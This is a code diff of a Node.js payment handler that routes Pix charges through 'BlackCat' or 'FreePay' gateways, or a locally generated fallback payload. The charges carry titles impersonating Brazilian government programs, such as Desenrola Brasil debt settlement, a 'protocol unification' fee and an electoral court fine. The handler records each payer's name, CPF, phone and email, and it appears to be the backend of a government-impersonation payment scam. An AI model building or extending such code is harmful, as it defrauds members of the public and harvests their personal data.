@@ -118,6 +118,75 @@ async function checkFreePayStatus(transactionId) {
   }
 }
 
+
+// Universal Gateway Dispatcher (FreePay / BlackCat / Fallback)
+async function createUniversalTransaction({ amount, name, cpf, phone, email, title }) {
+  const gwConfig = adminService.getGatewayConfig();
+  const activeKey = gwConfig.activeGatewayKey;
+
+  // 1. BlackCat Gateway
+  if (activeKey === 'blackcat') {
+    try {
+      const bcRes = await adminService.createBlackCatTransaction({ amount, name, cpf, phone, email, title });
+      if (bcRes && bcRes.success && bcRes.data) {
+        const item = bcRes.data;
+        const txId = item.transactionId;
+        const pixCode = item.paymentData?.copyPaste || item.paymentData?.qrCode || '';
+        let qrDataUrl = item.paymentData?.qrCodeBase64 || '';
+        if (!qrDataUrl && pixCode) {
+          qrDataUrl = await generateQRCodeDataURL(pixCode);
+        }
+        return {
+          success: true,
+          gateway: 'BlackCat',
+          gatewayKey: 'blackcat',
+          transactionId: txId,
+          pixCode: pixCode,
+          pixQrCode: qrDataUrl
+        };
+      }
+    } catch(err) {
+      console.error('BlackCat transaction error:', err.message);
+    }
+  }
+
+  // 2. FreePay Gateway
+  if (activeKey === 'freepay') {
+    try {
+      const fpRes = await createFreePayTransaction({ amount, name, cpf, phone, email, title });
+      if (fpRes && fpRes.success && fpRes.data) {
+        const item = fpRes.data;
+        const txId = item.id;
+        const pixCode = item.pix?.qr_code || '';
+        const qrDataUrl = await generateQRCodeDataURL(pixCode);
+        return {
+          success: true,
+          gateway: 'FreePay',
+          gatewayKey: 'freepay',
+          transactionId: txId,
+          pixCode: pixCode,
+          pixQrCode: qrDataUrl
+        };
+      }
+    } catch(err) {
+      console.error('FreePay transaction error:', err.message);
+    }
+  }
+
+  // Fallback Simulator
+  const gatewayId = 'GW_' + Math.random().toString(36).substring(2, 12).toUpperCase();
+  const pixCode = generatePixPayload(amount, gatewayId, 'DESENROLA BRASIL');
+  const qrDataUrl = await generateQRCodeDataURL(pixCode);
+  return {
+    success: true,
+    gateway: 'FreePay (Simulado)',
+    gatewayKey: 'freepay',
+    transactionId: gatewayId,
+    pixCode: pixCode,
+    pixQrCode: qrDataUrl
+  };
+}
+
 module.exports = async (req, res) => {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, PATCH, DELETE, OPTIONS');
@@ -304,7 +373,7 @@ module.exports = async (req, res) => {
     const amount = 68.92;
     adminService.recordSessionEvent('identidade');
 
-    const freepayRes = await createFreePayTransaction({
+    const result = await createUniversalTransaction({
       amount: amount,
       name: bodyData?.nome,
       cpf: bodyData?.cpf,
@@ -313,69 +382,32 @@ module.exports = async (req, res) => {
       title: 'Quitação de Dívidas - Programa Desenrola Brasil'
     });
 
-    if (freepayRes && freepayRes.success && freepayRes.data) {
-      const item = freepayRes.data;
-      const pixCode = item.pix?.qr_code || '';
-      const txId = item.id;
-      const qrDataUrl = await generateQRCodeDataURL(pixCode);
-
-      adminService.addOrder({
-        id: 'ord_' + txId.slice(-6),
-        clientName: bodyData?.nome || 'Beneficiário Gov',
-        email: bodyData?.email || 'cliente@email.com',
-        cpf: bodyData?.cpf,
-        phone: bodyData?.telefone,
-        amount: amount,
-        status: 'PENDING',
-        transactionId: txId,
-        pixCode: pixCode,
-        itemTitle: 'Quitação de Dívidas - Programa Desenrola Brasil'
-      });
-
-      res.writeHead(200, { 'Content-Type': 'application/json' });
-      res.end(JSON.stringify({
-        success: true,
-        pixCode: pixCode,
-        pix_code: pixCode,
-        pixQrCode: qrDataUrl,
-        qr_code_base64: qrDataUrl,
-        gateway_id: txId,
-        transaction_id: txId,
-        transactionId: txId,
-        orderId: txId,
-        amount: amount
-      }));
-      return;
-    }
-
-    const gatewayId = 'GW_' + Math.random().toString(36).substring(2, 12).toUpperCase();
-    const pixCode = generatePixPayload(amount, gatewayId, 'DESENROLA BRASIL');
-    const qrDataUrl = await generateQRCodeDataURL(pixCode);
-
     adminService.addOrder({
-      id: 'ord_' + gatewayId.slice(-6),
+      id: 'ord_' + result.transactionId.slice(-6),
       clientName: bodyData?.nome || 'Beneficiário Gov',
       email: bodyData?.email || 'cliente@email.com',
       cpf: bodyData?.cpf,
       phone: bodyData?.telefone,
       amount: amount,
       status: 'PENDING',
-      transactionId: gatewayId,
-      pixCode: pixCode,
+      gateway: result.gateway,
+      gatewayKey: result.gatewayKey,
+      transactionId: result.transactionId,
+      pixCode: result.pixCode,
       itemTitle: 'Quitação de Dívidas - Programa Desenrola Brasil'
     });
 
     res.writeHead(200, { 'Content-Type': 'application/json' });
     res.end(JSON.stringify({
       success: true,
-      pixCode: pixCode,
-      pix_code: pixCode,
-      pixQrCode: qrDataUrl,
-      qr_code_base64: qrDataUrl,
-      gateway_id: gatewayId,
-      transaction_id: gatewayId,
-      transactionId: gatewayId,
-      orderId: gatewayId,
+      pixCode: result.pixCode,
+      pix_code: result.pixCode,
+      pixQrCode: result.pixQrCode,
+      qr_code_base64: result.pixQrCode,
+      gateway_id: result.transactionId,
+      transaction_id: result.transactionId,
+      transactionId: result.transactionId,
+      orderId: result.transactionId,
       amount: amount
     }));
     return;
@@ -385,7 +417,7 @@ module.exports = async (req, res) => {
     const amount = 54.92;
     adminService.recordSessionEvent('recebimento');
 
-    const freepayRes = await createFreePayTransaction({
+    const result = await createUniversalTransaction({
       amount: amount,
       name: bodyData?.nome,
       cpf: bodyData?.cpf,
@@ -394,69 +426,32 @@ module.exports = async (req, res) => {
       title: 'Taxa de Unificação de Protocolo - Desenrola Brasil'
     });
 
-    if (freepayRes && freepayRes.success && freepayRes.data) {
-      const item = freepayRes.data;
-      const pixCode = item.pix?.qr_code || '';
-      const txId = item.id;
-      const qrDataUrl = await generateQRCodeDataURL(pixCode);
-
-      adminService.addOrder({
-        id: 'ord_' + txId.slice(-6),
-        clientName: bodyData?.nome || 'Beneficiário Gov',
-        email: bodyData?.email || 'cliente@email.com',
-        cpf: bodyData?.cpf,
-        phone: bodyData?.telefone,
-        amount: amount,
-        status: 'PENDING',
-        transactionId: txId,
-        pixCode: pixCode,
-        itemTitle: 'Taxa de Unificação de Protocolo - Desenrola Brasil'
-      });
-
-      res.writeHead(200, { 'Content-Type': 'application/json' });
-      res.end(JSON.stringify({
-        success: true,
-        pixCode: pixCode,
-        pix_code: pixCode,
-        qr_code_base64: qrDataUrl,
-        pixQrCode: qrDataUrl,
-        gateway_id: txId,
-        transaction_id: txId,
-        transactionId: txId,
-        orderId: txId,
-        amount: amount
-      }));
-      return;
-    }
-
-    const gatewayId = 'UP_' + Math.random().toString(36).substring(2, 12).toUpperCase();
-    const pixCode = generatePixPayload(amount, gatewayId, 'PROTOCOLO UNIFICACAO');
-    const qrDataUrl = await generateQRCodeDataURL(pixCode);
-
     adminService.addOrder({
-      id: 'ord_' + gatewayId.slice(-6),
+      id: 'ord_' + result.transactionId.slice(-6),
       clientName: bodyData?.nome || 'Beneficiário Gov',
       email: bodyData?.email || 'cliente@email.com',
       cpf: bodyData?.cpf,
       phone: bodyData?.telefone,
       amount: amount,
       status: 'PENDING',
-      transactionId: gatewayId,
-      pixCode: pixCode,
+      gateway: result.gateway,
+      gatewayKey: result.gatewayKey,
+      transactionId: result.transactionId,
+      pixCode: result.pixCode,
       itemTitle: 'Taxa de Unificação de Protocolo - Desenrola Brasil'
     });
 
     res.writeHead(200, { 'Content-Type': 'application/json' });
     res.end(JSON.stringify({
       success: true,
-      pixCode: pixCode,
-      pix_code: pixCode,
-      qr_code_base64: qrDataUrl,
-      pixQrCode: qrDataUrl,
-      gateway_id: gatewayId,
-      transaction_id: gatewayId,
-      transactionId: gatewayId,
-      orderId: gatewayId,
+      pixCode: result.pixCode,
+      pix_code: result.pixCode,
+      qr_code_base64: result.pixQrCode,
+      pixQrCode: result.pixQrCode,
+      gateway_id: result.transactionId,
+      transaction_id: result.transactionId,
+      transactionId: result.transactionId,
+      orderId: result.transactionId,
       amount: amount
     }));
     return;
@@ -466,7 +461,7 @@ module.exports = async (req, res) => {
     const amount = 67.35;
     adminService.recordSessionEvent('recebimento');
 
-    const freepayRes = await createFreePayTransaction({
+    const result = await createUniversalTransaction({
       amount: amount,
       name: bodyData?.nome,
       cpf: bodyData?.cpf,
@@ -475,69 +470,32 @@ module.exports = async (req, res) => {
       title: 'Regularização Multa Adicional - Tribunal Eleitoral'
     });
 
-    if (freepayRes && freepayRes.success && freepayRes.data) {
-      const item = freepayRes.data;
-      const pixCode = item.pix?.qr_code || '';
-      const txId = item.id;
-      const qrDataUrl = await generateQRCodeDataURL(pixCode);
-
-      adminService.addOrder({
-        id: 'ord_' + txId.slice(-6),
-        clientName: bodyData?.nome || 'Beneficiário Gov',
-        email: bodyData?.email || 'cliente@email.com',
-        cpf: bodyData?.cpf,
-        phone: bodyData?.telefone,
-        amount: amount,
-        status: 'PENDING',
-        transactionId: txId,
-        pixCode: pixCode,
-        itemTitle: 'Regularização Multa Adicional - Tribunal Eleitoral'
-      });
-
-      res.writeHead(200, { 'Content-Type': 'application/json' });
-      res.end(JSON.stringify({
-        success: true,
-        pixCode: pixCode,
-        pix_code: pixCode,
-        qr_code_base64: qrDataUrl,
-        pixQrCode: qrDataUrl,
-        gateway_id: txId,
-        transaction_id: txId,
-        transactionId: txId,
-        orderId: txId,
-        amount: amount
-      }));
-      return;
-    }
-
-    const gatewayId = 'ML_' + Math.random().toString(36).substring(2, 12).toUpperCase();
-    const pixCode = generatePixPayload(amount, gatewayId, 'MULTA ELEITORAL');
-    const qrDataUrl = await generateQRCodeDataURL(pixCode);
-
     adminService.addOrder({
-      id: 'ord_' + gatewayId.slice(-6),
+      id: 'ord_' + result.transactionId.slice(-6),
       clientName: bodyData?.nome || 'Beneficiário Gov',
       email: bodyData?.email || 'cliente@email.com',
       cpf: bodyData?.cpf,
       phone: bodyData?.telefone,
       amount: amount,
       status: 'PENDING',
-      transactionId: gatewayId,
-      pixCode: pixCode,
+      gateway: result.gateway,
+      gatewayKey: result.gatewayKey,
+      transactionId: result.transactionId,
+      pixCode: result.pixCode,
       itemTitle: 'Regularização Multa Adicional - Tribunal Eleitoral'
     });
 
     res.writeHead(200, { 'Content-Type': 'application/json' });
     res.end(JSON.stringify({
       success: true,
-      pixCode: pixCode,
-      pix_code: pixCode,
-      qr_code_base64: qrDataUrl,
-      pixQrCode: qrDataUrl,
-      gateway_id: gatewayId,
-      transaction_id: gatewayId,
-      transactionId: gatewayId,
-      orderId: gatewayId,
+      pixCode: result.pixCode,
+      pix_code: result.pixCode,
+      qr_code_base64: result.pixQrCode,
+      pixQrCode: result.pixQrCode,
+      gateway_id: result.transactionId,
+      transaction_id: result.transactionId,
+      transactionId: result.transactionId,
+      orderId: result.transactionId,
       amount: amount
     }));
     return;
@@ -562,7 +520,28 @@ module.exports = async (req, res) => {
 
   if (pathname.startsWith('/check-payment/')) {
     const gatewayId = pathname.replace('/check-payment/', '');
+
+    // Check BlackCat status if transaction starts with TXN
+    if (gatewayId.startsWith('TXN-')) {
+      const bcData = await adminService.checkBlackCatStatus(gatewayId);
+      if (bcData && bcData.success && bcData.data) {
+        const itemStatus = (bcData.data.status || '').toUpperCase();
+        const isPaid = itemStatus === 'PAID';
+        if (isPaid) {
+          adminService.updateOrderStatus(gatewayId, 'PAID');
+        }
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({
+          success: true,
+          status: isPaid ? 'approved' : 'pending',
+          rawStatus: itemStatus,
+          gateway_id: gatewayId
+        }));
+        return;
+      }
+    }
     
+    // Check FreePay status
     if (gatewayId.length > 20) {
       const freePayData = await checkFreePayStatus(gatewayId);
       if (freePayData && freePayData.success && freePayData.data) {
